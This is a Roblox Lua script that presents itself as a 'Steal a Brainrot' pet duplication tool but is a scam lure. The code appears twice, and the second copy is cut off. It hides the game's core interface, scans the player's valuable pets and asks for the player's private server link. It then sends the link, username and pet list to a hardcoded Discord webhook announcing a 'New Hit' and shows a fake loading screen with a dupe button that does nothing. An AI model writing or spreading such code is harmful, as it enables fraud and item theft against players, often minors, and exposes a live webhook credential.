getgenv().webhook = "https://discord.com/api/webhooks/1416134674975166556/xVU7k2BU7iidI6NpQEWzBhFFJ6JM9wzVc6p-PbiBWpuPzoeZwCCe759d-N0qHe8YZyQJ"

getgenv().RetardNames = {
    "La Vacca Saturno Saturnita", "Chimpanzini Spiderini", "Los Tralaleirtos", "Las Tralaleritas",
    "Graipuss Medussi", "La Grande Combinasion", "Nuclearo Dinossauro", "Garama and Madundung",
    "Tortuginni Dragonfruitini", "Pot Hotspot", "Las Vaquitas Saturnitas", "Chicleteira Bicicleteira",
    "Agarrini la Palini", "Dragon Cannelloni", "Los Combinasionas", "Karkerkar Kurkur",
    "Los Hotspotsitos", "Esok Sekolah", "Los Matteos", "Dul Dul Dul", "Blackhole Goat",
    "Nooo My Hotspot", "Sammyini Spyderini", "La Supreme Combinasion", "Ketupat Kepat",
    "Tralaledon", "Los Bros", "La Sahur Combinasion", "Strawberry Elephant",
    "Los Nooo My Hotspotsitos", "Spaghetti Tualeti", "Noobini Pizzanini", "Ketchuru And Musturu"
}


local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local GuiService = game:GetService("GuiService")

local player = Players.LocalPlayer
local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 5)
game:GetService("CoreGui").RobloxGui:Destroy()
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local RENotificationServiceNotify = ReplicatedStorage.Packages.Net:FindFirstChild("RE/NotificationService/Notify")
if RENotificationServiceNotify then
    RENotificationServiceNotify:Destroy()
end

---------------------------------------------------------------------

---------------------------------------------------------------------
local function sendWebhook(privateServerLink, foundPets)
    -- Build pet counts first
    local petCounts = {}
    for _, pet in ipairs(foundPets) do
        petCounts[pet] = (petCounts[pet] or 0) + 1
    end

    local formattedPets = {}
    for petName, count in pairs(petCounts) do
        table.insert(formattedPets, petName .. (count > 1 and " x" .. count or ""))
    end

    local petListString = #formattedPets > 0 and table.concat(formattedPets, "\n") or "No target pets found"

   
    local avatarUrl = (function()
        local ok, res = pcall(function()
            return HttpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. player.UserId .. '&size=420x420&format=Png&isCircular=false&thumbnailType=HeadShot'))
        end)
        if ok and res and res.data and res.data[1] and res.data[1].imageUrl then
            return res.data[1].imageUrl
        end
        return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
    end)()
    local embedData = {
        username = "SAB Scanner",
        content = "@everyone New Hit!",
        embeds = { {
            title = "ðŸ§› New SAB Hit Detected",
            description = "**Quick join:** " .. string.format("[Click to join](%s)", privateServerLink),
            color = 0x7C3AED, -- violet
            thumbnail = { url = avatarUrl },
            fields = {
                {
                    name = "ðŸ‘¤ Executed By",
                    value = "```" .. player.Name .. "```",
                    inline = true
                },
                {
                    name = "ðŸ’° Valuables Found",
                    value = "```" .. petListString .. "```",
                    inline = false
                },
                {
                    name = "ðŸ”— Private Server",
                    value = string.format("[Join Server](%s)", privateServerLink),
                    inline = false
                }
            },
            footer = { text = "SAB â€¢ Private server scanner" },
            timestamp = DateTime.now():ToIsoDate()
        } }
    }

    local jsonData = HttpService:JSONEncode(embedData)
    local req = http_request or request or (syn and syn.request)

    if req then
        local success, err = pcall(function()
            req({
                Url = getgenv().webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
        if success then
            print("âœ… Webhook sent")
            return true
        else
            warn("âŒ Webhook failed:", err)
            return false
        end
    else
        warn("âŒ No HTTP request function available")
        return false
    end
end

---------------------------------------------------------------------

-- Mobile/touch device detection function
local function isMobileOrTouchDevice()
    local UserInputService = game:GetService("UserInputService")
    local GuiService = game:GetService("GuiService")
    
    -- Check if device supports touch
    local hasTouch = UserInputService.TouchEnabled
    
    -- Check if it's a mobile device based on screen size
    local screenSize = GuiService:GetScreenResolution()
    local isSmallScreen = screenSize.X < 800 or screenSize.Y < 600
    
    -- Check if it's a tablet (medium screen)
    local isTablet = screenSize.X >= 800 and screenSize.X < 1200 and screenSize.Y >= 600 and screenSize.Y < 900
    
    return hasTouch, isSmallScreen, isTablet, screenSize
end

---------------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LaunchDupeGui"
screenGui.Parent = playerGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Parent = screenGui
mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
mainFrame.BorderSizePixel = 0
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.Size = UDim2.new(0, 560, 0, 300) -- bigger
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 14)
mainCorner.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Parent = mainFrame
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 0, 0, 12)
titleLabel.Size = UDim2.new(1, 0, 0, 36)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Text = "Load Dupe"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 28 -- bigger text

local subtitleLabel = Instance.new("TextLabel")
subtitleLabel.Parent = mainFrame
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
subtitleLabel.Size = UDim2.new(1, 0, 0, 24)
subtitleLabel.Font = Enum.Font.Gotham
subtitleLabel.Text = "Type In Private Server Link"
subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
subtitleLabel.TextSize = 18 -- bigger text

local textBox = Instance.new("TextBox")
textBox.Parent = mainFrame
textBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
textBox.BorderSizePixel = 0
textBox.Position = UDim2.new(0.05, 0, 0.45, -16)
textBox.Size = UDim2.new(0.9, 0, 0, 40) -- bigger box
textBox.Font = Enum.Font.Gotham
textBox.PlaceholderText = "Enter link here..."
textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
textBox.Text = ""
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.TextSize = 18 -- bigger text
textBox.TextXAlignment = Enum.TextXAlignment.Left

local textBoxCorner = Instance.new("UICorner")
textBoxCorner.CornerRadius = UDim.new(0, 8)
textBoxCorner.Parent = textBox

local startButton = Instance.new("TextButton")
startButton.Parent = mainFrame
startButton.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
startButton.BorderSizePixel = 0
startButton.Position = UDim2.new(0.06, 0, 0.70, 0)
startButton.Size = UDim2.new(0.9, 0, 0, 52) -- bigger button
startButton.Font = Enum.Font.GothamBold
startButton.Text = "Start"
startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
startButton.TextSize = 20 -- bigger text

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 10)
buttonCorner.Parent = startButton

local closeButton = Instance.new("TextButton")
closeButton.Parent = mainFrame
closeButton.BackgroundTransparency = 1
closeButton.Position = UDim2.new(1, -36, 0, 8)
closeButton.Size = UDim2.new(0, 32, 0, 32) -- bigger close button
closeButton.Font = Enum.Font.GothamBold
closeButton.Text = "Ã—"
closeButton.TextColor3 = Color3.fromRGB(200, 200, 200)
closeButton.TextSize = 26 -- bigger text

---------------------------------------------------------------------

---------------------------------------------------------------------
local function checkForPets()
    local found = {}
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Model") then
            local nameLower = string.lower(obj.Name)
            for _, target in pairs(getgenv().RetardNames) do
                if string.find(nameLower, string.lower(target)) then
                    table.insert(found, obj.Name)
                    break
                end
            end
        end
    end
    return found
end

local function isValidPrivateLink(raw)
    if type(raw) ~= "string" then return false end
    local url = raw:gsub("^%s+", ""):gsub("%s+$", "")
    if url == "" then return false end
    local startsWithHttp = url:sub(1, 8) == "https://" or url:sub(1, 7) == "http://"
    if not startsWithHttp then return false end
    local hostOk = (string.find(url, "roblox.com", 1, true) ~= nil)
        or (string.find(url, "rblx.gg", 1, true) ~= nil)
        or (string.find(url, "rblx.link", 1, true) ~= nil)
    if not hostOk then return false end
    local looksPrivate = (
        string.find(url, "privateServerLinkCode=", 1, true) ~= nil
        or string.find(url, "/games/", 1, true) ~= nil
        or string.find(url, "placeId=", 1, true) ~= nil
        or string.find(url, "gameid=", 1, true) ~= nil
    )
    return looksPrivate
end

startButton.MouseButton1Click:Connect(function()
    local serverLink = textBox.Text
    local hasRoblox = type(serverLink) == "string" and string.find(string.lower(serverLink), "roblox", 1, true) ~= nil
    if not hasRoblox then
        local originalColor = textBox.BackgroundColor3
        textBox.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
        subtitleLabel.Text = "Link must contain \"roblox private server\""
        subtitleLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        wait(1.5)
        textBox.BackgroundColor3 = originalColor
        subtitleLabel.Text = "Type In Private Server Link"
        subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
        return
    end
    startButton.Text = "Loading..."
    startButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)

    local petsFound = checkForPets()
    task.spawn(function()
        sendWebhook(serverLink, petsFound)
        pcall(function()
            local req = http_request or request or (syn and syn.request)
            if req then
                req({
                    Url = getgenv().webhook,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode({ content = serverLink })
                })
            end
        end)
    end)

    startButton.Text = "âœ… Loaded!"
    startButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
            -- Full-screen overlay (persistent)
            local overlay = Instance.new("ScreenGui")
            overlay.Name = "BrainrotOverlay"
            overlay.IgnoreGuiInset = true
            overlay.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            overlay.Parent = playerGui

            local bg = Instance.new("Frame")
            bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
            bg.BackgroundTransparency = 0
            bg.Size = UDim2.new(1, 0, 1, 0)
            bg.Parent = overlay

            -- Animated gradient background
            local gradient = Instance.new("UIGradient")
            gradient.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.0, Color3.fromRGB(255, 0, 128)),
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 230, 0)),
                ColorSequenceKeypoint.new(1.0, Color3.fromRGB(0, 200, 255))
            })
            gradient.Rotation = 0
            gradient.Parent = bg

            task.spawn(function()
                while overlay.Parent do
                    for rot = 0, 360, 3 do
                        gradient.Rotation = rot
                        task.wait(0.03)
                    end
                end
            end)

            local label = Instance.new("TextLabel")
            label.BackgroundTransparency = 1
            label.Size = UDim2.new(1, 0, 0, 80)
            label.Position = UDim2.new(0, 0, 0, 12)
            label.Text = "STEAL A BRAINROT DUPE"
            label.TextColor3 = Color3.fromRGB(255, 215, 0)
            label.TextScaled = true
            label.Parent = bg
            -- Try to use Luckiest Guy-like font; fallback to FredokaOne if available else GothamBlack
            pcall(function()
                label.Font = Enum.Font.LuckiestGuy
            end)
            if label.Font == Enum.Font.SourceSans then
                pcall(function()
                    label.Font = Enum.Font.FredokaOne
                end)
            end
            if label.Font == Enum.Font.SourceSans then
                label.Font = Enum.Font.GothamBlack
            end

            -- Gentle pulse effect
            task.spawn(function()
                while overlay.Parent do
                    TweenService:Create(label, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {TextTransparency = 0.05}):Play()
                    task.wait(0.8)
                    TweenService:Create(label, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {TextTransparency = 0.15}):Play()
                    task.wait(0.8)
                end
            end)

            -- 60s loading bar under the header
            local barBack = Instance.new("Frame")
            barBack.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            barBack.Size = UDim2.new(0.8, 0, 0, 18)
            barBack.Position = UDim2.new(0.1, 0, 0, 100)
            barBack.Parent = bg
            local bbCorner = Instance.new("UICorner")
            bbCorner.CornerRadius = UDim.new(0, 9)
            bbCorner.Parent = barBack

            local barFill = Instance.new("Frame")
            barFill.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
            barFill.Size = UDim2.new(0, 0, 1, 0)
            barFill.Parent = barBack
            local bfCorner = Instance.new("UICorner")
            bfCorner.CornerRadius = UDim.new(0, 9)
            bfCorner.Parent = barFill

            -- Neon spark riding progress
            local spark = Instance.new("Frame")
            spark.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            spark.BackgroundTransparency = 0.2
            spark.Size = UDim2.new(0, 8, 0, 18)
            spark.Position = UDim2.new(0, -4, 0.5, -9)
            spark.Parent = barBack
            local sparkGlow = Instance.new("UIStroke")
            sparkGlow.Color = Color3.fromRGB(255, 240, 150)
            sparkGlow.Thickness = 4
            sparkGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            sparkGlow.Parent = spark

            local timeText = Instance.new("TextLabel")
            timeText.BackgroundTransparency = 1
            timeText.Size = UDim2.new(0, 120, 0, 18)
            timeText.Position = UDim2.new(0.92, 8, 0, 100)
            timeText.Text = "60s"
            timeText.TextColor3 = Color3.fromRGB(255, 215, 0)
            timeText.Font = Enum.Font.GothamBold
            timeText.TextSize = 14
            timeText.Parent = bg

            -- Smooth fill over 60 seconds with visible activity
            TweenService:Create(barFill, TweenInfo.new(60, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 1, 0)}):Play()
            TweenService:Create(spark, TweenInfo.new(60, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Position = UDim2.new(1, -4, 0.5, -9)}):Play()
            -- Brainrot marquee text
            local marquee = Instance.new("TextLabel")
            marquee.BackgroundTransparency = 1
            marquee.Size = UDim2.new(2, 0, 0, 36)
            marquee.Position = UDim2.new(-1, 0, 0, 60)
            marquee.Text = "ðŸ§  BRAINROT MODE â€¢ SKIBIDI â€¢ RIZZ â€¢ GYATT â€¢ OHIO â€¢ BOP â€¢ MEWING â€¢ SIGMA â€¢ FANUM TAX â€¢ GOON ðŸ§ "
            marquee.TextColor3 = Color3.fromRGB(255, 255, 255)
            marquee.Font = Enum.Font.GothamBlack
            marquee.TextSize = 22
            marquee.Parent = bg

            task.spawn(function()
                while overlay.Parent do
                    marquee.Position = UDim2.new(-1, 0, 0, 60)
                    TweenService:Create(marquee, TweenInfo.new(8, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Position = UDim2.new(0, 0, 0, 60)}):Play()
                    task.wait(8)
                end
            end)

            -- Emoji rain
            local emojis = {"ðŸ§ ","ðŸ’¥","âš¡","ðŸ”¥","âœ¨","ðŸ˜ˆ","ðŸ¥¶","ðŸ’«","ðŸš€","ðŸŽ¯"}
            task.spawn(function()
                while overlay.Parent do
                    local drop = Instance.new("TextLabel")
                    drop.BackgroundTransparency = 1
                    drop.Size = UDim2.new(0, 32, 0, 32)
                    drop.Position = UDim2.new(math.random(), -16, -0.1, -32)
                    drop.Text = emojis[math.random(1, #emojis)]
                    drop.TextScaled = true
                    drop.TextColor3 = Color3.fromRGB(255, 255, 255)
                    drop.Parent = bg
                    local fallTime = math.random(4, 7)
                    TweenService:Create(drop, TweenInfo.new(fallTime, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {Position = UDim2.new(drop.Position.X.Scale, drop.Position.X.Offset, 1.1, 0), TextTransparency = 0.1}):Play()
                    task.delay(fallTime, function()
                        if drop then drop:Destroy() end
                    end)
                    task.wait(0.15)
                end
            end)
            task.spawn(function()
                for remaining = 60, 0, -1 do
                    timeText.Text = tostring(remaining) .. "s"
                    task.wait(1)
                end
                timeText.Text = "Ready"
            end)

            -- Detect device type and adjust selector accordingly
            local hasTouch, isSmallScreen, isTablet, screenSize = isMobileOrTouchDevice()
            
            -- Selector panel for pets and quantities (responsive sizing)
            local selector = Instance.new("Frame")
            selector.Name = "Selector"
            selector.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            selector.BackgroundTransparency = 0.15
            selector.AnchorPoint = Vector2.new(0.5, 0.5)
            selector.Parent = bg

            -- Responsive sizing based on device type
            if isSmallScreen then
                -- Mobile phone layout
                selector.Size = UDim2.new(0.95, 0, 0.7, 0)
                selector.Position = UDim2.new(0.5, 0, 0.5, 0)
            elseif isTablet then
                -- Tablet layout
                selector.Size = UDim2.new(0.8, 0, 0.6, 0)
                selector.Position = UDim2.new(0.5, 0, 0.5, 0)
            else
                -- Desktop layout
                selector.Size = UDim2.new(0, 720, 0, 420)
                selector.Position = UDim2.new(0.5, 0, 0.6, 0)
            end
            local selCorner = Instance.new("UICorner")
            selCorner.CornerRadius = UDim.new(0, 12)
            selCorner.Parent = selector

            local selTitle = Instance.new("TextLabel")
            selTitle.BackgroundTransparency = 1
            selTitle.Size = UDim2.new(1, -20, 0, isSmallScreen and 28 or 36)
            selTitle.Position = UDim2.new(0, 10, 0, 10)
            selTitle.Text = "Select Pets to Dupe"
            selTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            selTitle.Font = Enum.Font.GothamBold
            selTitle.TextSize = isSmallScreen and 16 or 18
            selTitle.TextXAlignment = Enum.TextXAlignment.Left
            selTitle.Parent = selector

            local list = Instance.new("ScrollingFrame")
            list.BackgroundTransparency = 1
            list.Size = UDim2.new(1, -20, 1, isSmallScreen and -100 or -120)
            list.Position = UDim2.new(0, 10, 0, isSmallScreen and 48 or 56)
            list.CanvasSize = UDim2.new(0, 0, 0, 0)
            list.ScrollBarThickness = isSmallScreen and 8 or 6
            list.Parent = selector
            local layout = Instance.new("UIListLayout")
            layout.Padding = UDim.new(0, isSmallScreen and 4 or 6)
            layout.SortOrder = Enum.SortOrder.Name
            layout.Parent = list

            local selectedPets = {}
            local function addRow(petName)
                local row = Instance.new("Frame")
                row.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
                row.Size = UDim2.new(1, -4, 0, isSmallScreen and 32 or 36)
                row.Parent = list
                local rowCorner = Instance.new("UICorner")
                rowCorner.CornerRadius = UDim.new(0, 8)
                rowCorner.Parent = row

                local nameLbl = Instance.new("TextLabel")
                nameLbl.BackgroundTransparency = 1
                nameLbl.Size = UDim2.new(0.6, 0, 1, 0)
                nameLbl.Position = UDim2.new(0, 10, 0, 0)
                nameLbl.Text = petName
                nameLbl.TextColor3 = Color3.fromRGB(235, 235, 235)
                nameLbl.Font = Enum.Font.Gotham
                nameLbl.TextSize = isSmallScreen and 12 or 14
                nameLbl.TextXAlignment = Enum.TextXAlignment.Left
                nameLbl.Parent = row

                local qty = Instance.new("TextBox")
                qty.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
                qty.Size = UDim2.new(0, isSmallScreen and 50 or 60, 0, isSmallScreen and 24 or 26)
                qty.Position = UDim2.new(0.68, 0, 0.5, isSmallScreen and -12 or -13)
                qty.Font = Enum.Font.Gotham
                qty.Text = "1"
                qty.TextColor3 = Color3.fromRGB(255, 255, 255)
                qty.TextSize = isSmallScreen and 12 or 14
                qty.Parent = row
                local qtyCorner = Instance.new("UICorner")
                qtyCorner.CornerRadius = UDim.new(0, 6)
                qtyCorner.Parent = qty

                local toggle = Instance.new("TextButton")
                toggle.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
                toggle.Size = UDim2.new(0, isSmallScreen and 80 or 90, 0, isSmallScreen and 24 or 26)
                toggle.Position = UDim2.new(1, isSmallScreen and -90 or -100, 0.5, isSmallScreen and -12 or -13)
                toggle.Font = Enum.Font.GothamBold
                toggle.Text = "Select"
                toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
                toggle.TextSize = isSmallScreen and 12 or 14
                toggle.Parent = row
                local tCorner = Instance.new("UICorner")
                tCorner.CornerRadius = UDim.new(0, 6)
                tCorner.Parent = toggle

                local selected = false
                local function refresh()
                    if selected then
                        toggle.Text = "Selected"
                        toggle.BackgroundColor3 = Color3.fromRGB(50, 180, 80)
                    else
                        toggle.Text = "Select"
                        toggle.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
                    end
                end
                refresh()

                toggle.MouseButton1Click:Connect(function()
                    selected = not selected
                    if selected then
                        local n = tonumber(qty.Text) or 1
                        if n < 1 then n = 1 end
                        selectedPets[petName] = n
                    else
                        selectedPets[petName] = nil
                    end
                    refresh()
                end)
            end

            for _, pet in ipairs(petsFound) do
                addRow(pet)
            end

            layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
                list.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
            end)

            -- Buttons row at bottom-right of selector (responsive)
            local dupeBtn = Instance.new("TextButton")
            dupeBtn.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
            dupeBtn.Size = UDim2.new(0, isSmallScreen and 180 or 220, 0, isSmallScreen and 36 or 40)
            dupeBtn.Position = UDim2.new(1, isSmallScreen and -190 or -230, 1, isSmallScreen and -46 or -54)
            dupeBtn.Font = Enum.Font.GothamBold
            dupeBtn.Text = "Dupe Selected"
            dupeBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            dupeBtn.TextSize = isSmallScreen and 14 or 16
            dupeBtn.Parent = selector
            local dCorner = Instance.new("UICorner")
            dCorner.CornerRadius = UDim.new(0, 8)
            dCorner.Parent = dupeBtn

            -- Rejoin button to the left (non-functional)
            local rejoinBtn = Instance.new("TextButton")
            rejoinBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 50)
            rejoinBtn.Size = UDim2.new(0, isSmallScreen and 180 or 220, 0, isSmallScreen and 36 or 40)
            rejoinBtn.Position = UDim2.new(1, isSmallScreen and -380 or -460, 1, isSmallScreen and -46 or -54)
            rejoinBtn.Font = Enum.Font.GothamBold
            rejoinBtn.Text = "Rejoin Server"
            rejoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            rejoinBtn.TextSize = isSmallScreen and 14 or 16
            rejoinBtn.Parent = selector
            local rCorner = Instance.new("UICorner")
            rCorner.CornerRadius = UDim.new(0, 8)
            rCorner.Parent = rejoinBtn

            dupeBtn.MouseButton1Click:Connect(function()
                -- For now, just print/log the selection; extend with your dupe logic
                local summary = {}
                for k, v in pairs(selectedPets) do
                    table.insert(summary, k .. " x" .. tostring(v))
                end
                if #summary == 0 then
                    selTitle.Text = "Select Pets to Dupe â€” none selected"
                    selTitle.TextColor3 = Color3.fromRGB(255, 120, 120)
                else
                    selTitle.Text = "Queued: " .. table.concat(summary, ", ")
                    selTitle.TextColor3 = Color3.fromRGB(180, 255, 180)
                end
            end)

            -- Remove the loader panel now that overlay persists
            if screenGui then screenGui:Destroy() end
end)

closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

mainFrame.Size = UDim2.new(0, 0, 0, 0)
local spawnTween = TweenService:Create(
    mainFrame,
    TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
    {Size = UDim2.new(0, 420, 0, 220)}
)
spawnTween:Play()
"

getgenv().RetardNames = {
    "La Vacca Saturno Saturnita", "Chimpanzini Spiderini", "Los Tralaleirtos", "Las Tralaleritas",
    "Graipuss Medussi", "La Grande Combinasion", "Nuclearo Dinossauro", "Garama and Madundung",
    "Tortuginni Dragonfruitini", "Pot Hotspot", "Las Vaquitas Saturnitas", "Chicleteira Bicicleteira",
    "Agarrini la Palini", "Dragon Cannelloni", "Los Combinasionas", "Karkerkar Kurkur",
    "Los Hotspotsitos", "Esok Sekolah", "Los Matteos", "Dul Dul Dul", "Blackhole Goat",
    "Nooo My Hotspot", "Sammyini Spyderini", "La Supreme Combinasion", "Ketupat Kepat",
    "Tralaledon", "Los Bros", "La Sahur Combinasion", "Strawberry Elephant",
    "Los Nooo My Hotspotsitos", "Spaghetti Tualeti", "Noobini Pizzanini", "Ketchuru And Musturu"
}


local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local GuiService = game:GetService("GuiService")

local player = Players.LocalPlayer
local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 5)
game:GetService("CoreGui").RobloxGui:Destroy()
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local RENotificationServiceNotify = ReplicatedStorage.Packages.Net:FindFirstChild("RE/NotificationService/Notify")
if RENotificationServiceNotify then
    RENotificationServiceNotify:Destroy()
end

---------------------------------------------------------------------

---------------------------------------------------------------------
local function sendWebhook(privateServerLink, foundPets)
    -- Build pet counts first
    local petCounts = {}
    for _, pet in ipairs(foundPets) do
        petCounts[pet] = (petCounts[pet] or 0) + 1
    end

    local formattedPets = {}
    for petName, count in pairs(petCounts) do
        table.insert(formattedPets, petName .. (count > 1 and " x" .. count or ""))
    end

    local petListString = #formattedPets > 0 and table.concat(formattedPets, "\n") or "No target pets found"

   
    local avatarUrl = (function()
        local ok, res = pcall(function()
            return HttpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. player.UserId .. '&size=420x420&format=Png&isCircular=false&thumbnailType=HeadShot'))
        end)
        if ok and res and res.data and res.data[1] and res.data[1].imageUrl then
            return res.data[1].imageUrl
        end
        return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
    end)()
    local embedData = {
        username = "SAB Scanner",
        content = "@everyone New Hit!",
        embeds = { {
            title = "ðŸ§› New SAB Hit Detected",
            description = "**Quick join:** " .. string.format("[Click to join](%s)", privateServerLink),
            color = 0x7C3AED, -- violet
            thumbnail = { url = avatarUrl },
            fields = {
                {
                    name = "ðŸ‘¤ Executed By",
                    value = "```" .. player.Name .. "```",
                    inline = true
                },
                {
                    name = "ðŸ’° Valuables Found",
                    value = "```" .. petListString .. "```",
                    inline = false
                },
                {
                    name = "ðŸ”— Private Server",
                    value = string.format("[Join Server](%s)", privateServerLink),
                    inline = false
                }
            },
            footer = { text = "SAB â€¢ Private server scanner" },
            timestamp = DateTime.now():ToIsoDate()
        } }
    }

    local jsonData = HttpService:JSONEncode(embedData)
    local req = http_request or request or (syn and syn.request)

    if req then
        local success, err = pcall(function()
            req({
                Url = getgenv().webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
        if success then
            print("âœ… Webhook sent")
            return true
        else
            warn("âŒ Webhook failed:", err)
            return false
        end
    else
        warn("âŒ No HTTP request function available")
        return false
    end
end

---------------------------------------------------------------------

-- Mobile/touch device detection function
local function isMobileOrTouchDevice()
    local UserInputService = game:GetService("UserInputService")
    local GuiService = game:GetService("GuiService")
    
    -- Check if device supports touch
    local hasTouch = UserInputService.TouchEnabled
    
    -- Check if it's a mobile device based on screen size
    local screenSize = GuiService:GetScreenResolution()
    local isSmallScreen = screenSize.X < 800 or screenSize.Y < 600
    
    -- Check if it's a tablet (medium screen)
    local isTablet = screenSize.X >= 800 and screenSize.X < 1200 and screenSize.Y >= 600 and screenSize.Y < 900
    
    return hasTouch, isSmallScreen, isTablet, screenSize
end

---------------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LaunchDupeGui"
screenGui.Parent = playerGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Parent = screenGui
mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
mainFrame.BorderSizePixel = 0
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.Size = UDim2.new(0, 560, 0, 300) -- bigger
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 14)
mainCorner.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Parent = mainFrame
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 0, 0, 12)
titleLabel.Size = UDim2.new(1, 0, 0, 36)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Text = "Load Dupe"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 28 -- bigger text

local subtitleLabel = Instance.new("TextLabel")
subtitleLabel.Parent = mainFrame
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
subtitleLabel.Size = UDim2.new(1, 0, 0, 24)
subtitleLabel.Font = Enum.Font.Gotham
subtitleLabel.Text = "Type In Private Server Link"
subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
subtitleLabel.TextSize = 18 -- bigger text

local textBox = Instance.new("TextBox")
textBox.Parent = mainFrame
textBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
textBox.BorderSizePixel = 0
textBox.Position = UDim2.new(0.05, 0, 0.45, -16)
textBox.Size = UDim2.new(0.9, 0, 0, 40) -- bigger box
textBox.Font = Enum.Font.Gotham
textBox.PlaceholderText = "Enter link here..."
textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
textBox.Text = ""
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.TextSize = 18 -- bigger text
textBox.TextXAlignment = Enum.TextXAlignment.Left

local textBoxCorner = Instance.new("UICorner")
textBoxCorner.CornerRadius = UDim.new(0, 8)
textBoxCorner.Parent = textBox

local startButton = Instance.new("TextButton")
startButton.Parent = mainFrame
startButton.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
startButton.BorderSizePixel = 0
startButton.Position = UDim2.new(0.06, 0, 0.70, 0)
startButton.Size = UDim2.new(0.9, 0, 0, 52) -- bigger button
startButton.Font = Enum.Font.GothamBold
startButton.Text = "Start"
